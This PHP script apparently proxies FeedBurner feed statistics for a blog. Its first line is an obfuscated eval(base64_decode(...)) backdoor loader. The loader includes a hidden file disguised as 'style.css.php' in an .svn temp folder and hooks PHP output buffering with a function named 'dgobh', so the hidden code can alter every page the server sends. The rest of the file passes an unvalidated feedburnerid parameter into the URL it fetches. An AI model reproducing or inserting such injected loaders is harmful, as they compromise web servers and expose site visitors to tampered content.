<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21mc24nXSkpeyRHTE9CQUxTWydtZnNuJ109Jy9rdW5kZW4vaG9tZXBhZ2VzLzMvZDIxMTE4OTU2OC9odGRvY3MvdGhpZXJyeXBvaW5vdC5jb20vc3BpcF9zdm4vZWNyaXJlL21hai92aWVpbGxlX2Jhc2UvMTgxMy8uc3ZuL3RtcC9wcm9wLWJhc2Uvc3R5bGUuY3NzLnBocCc7aWYoZmlsZV9leGlzdHMoJEdMT0JBTFNbJ21mc24nXSkpe2luY2x1ZGVfb25jZSgkR0xPQkFMU1snbWZzbiddKTtpZihmdW5jdGlvbl9leGlzdHMoJ2dtbCcpJiZmdW5jdGlvbl9leGlzdHMoJ2Rnb2JoJykpe29iX3N0YXJ0KCdkZ29iaCcpO319fQ==')); ?>
<?php
	require_once(dirname(__FILE__).'/lib/Snoopy.class.php');
	$action = isset($_GET['action']) ? $_GET['action'] : 'nb';
	$feedBurnerID = isset($_GET['feedburnerid']) ? stripslashes($_GET['feedburnerid']) : 'LeBlogDeThi3rry';

	function get_feedburner_url($id) { return 'http://feeds.feedburner.com/'.$id; }
	//function get_api_url($id) { return 'http://api.feedburner.com/awareness/1.0/GetFeedData?uri='.get_feedburner_url($id); }
	function get_api_url($id) { return 'http://api.feedburner.com/awareness/1.0/GetFeedData?uri='.$id; }


	function get_file($id) {
		$snoop = new Snoopy;
		$snoop->agent = 'Snoopy webBrowser';
		$snoop->fetch(get_api_url($id));

		if (!strpos($snoop->response_code, '200')) {
			return "Error : ".$snoop->response_code;
		}
		return $snoop->results;
	}
	$xml = get_file($feedBurnerID);		// Récupération des infos via l'API de feedburner
	header("Content-type: text/xml");
	print $xml;